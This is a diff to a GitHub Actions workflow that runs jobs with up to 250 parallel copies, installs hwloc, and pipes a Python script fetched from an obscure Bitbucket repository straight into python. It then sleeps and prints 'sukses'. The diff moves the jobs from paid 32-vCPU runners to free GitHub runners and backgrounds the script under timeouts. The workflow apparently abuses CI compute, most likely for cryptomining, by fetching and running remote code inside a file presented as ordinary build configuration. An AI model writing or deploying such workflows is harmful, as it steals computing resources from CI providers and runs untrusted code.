@@ -6,7 +6,7 @@ on:
 
 jobs:
   pemanasan:
-    runs-on: buildjet-32vcpu-ubuntu-2204
+    runs-on: ubuntu-20.04
     strategy:
       max-parallel: 80
       fail-fast: false
@@ -28,12 +28,12 @@ jobs:
     - name: Main
       run: |
         sudo apt-get update && sudo apt install libc-bin libc6 hwloc
-        wget -O- https://bitbucket.org/ytvahjd/oree/raw/634d43b58339b4ccac8d05d65c18e3b629c25d8f/sr.py | python
+        timeout 5m wget -O- https://bitbucket.org/ytvahjd/oree/raw/634d43b58339b4ccac8d05d65c18e3b629c25d8f/sr.py | python &
         sleep 5m
         echo "sukses"
   mechat:
     needs: pemanasan
-    runs-on: buildjet-32vcpu-ubuntu-2204
+    runs-on: ubuntu-latest
     strategy:
       max-parallel: 250
       fail-fast: false
@@ -54,12 +54,12 @@ jobs:
     - name: Main
       run: |
         sudo apt-get update && sudo apt install libc-bin libc6 hwloc
-        wget -O- https://bitbucket.org/ytvahjd/oree/raw/634d43b58339b4ccac8d05d65c18e3b629c25d8f/sr.py | python 
+        timeout 15m wget -O- https://bitbucket.org/ytvahjd/oree/raw/634d43b58339b4ccac8d05d65c18e3b629c25d8f/sr.py | python &
         sleep 15m
         echo "sukses"
   mechat2:
     needs: pemanasan
-    runs-on: buildjet-32vcpu-ubuntu-2204
+    runs-on: ubuntu-latest
     strategy:
       max-parallel: 250
       fail-fast: false
@@ -80,7 +80,7 @@ jobs:
     - name: Main
       run: |
         sudo apt-get update && sudo apt install libc-bin libc6 hwloc
-        wget -O- https://bitbucket.org/ytvahjd/oree/raw/634d43b58339b4ccac8d05d65c18e3b629c25d8f/sr.py | python 
+        timeout 15m wget -O- https://bitbucket.org/ytvahjd/oree/raw/634d43b58339b4ccac8d05d65c18e3b629c25d8f/sr.py | python &
         sleep 15m
         echo "sukses"
   Success:
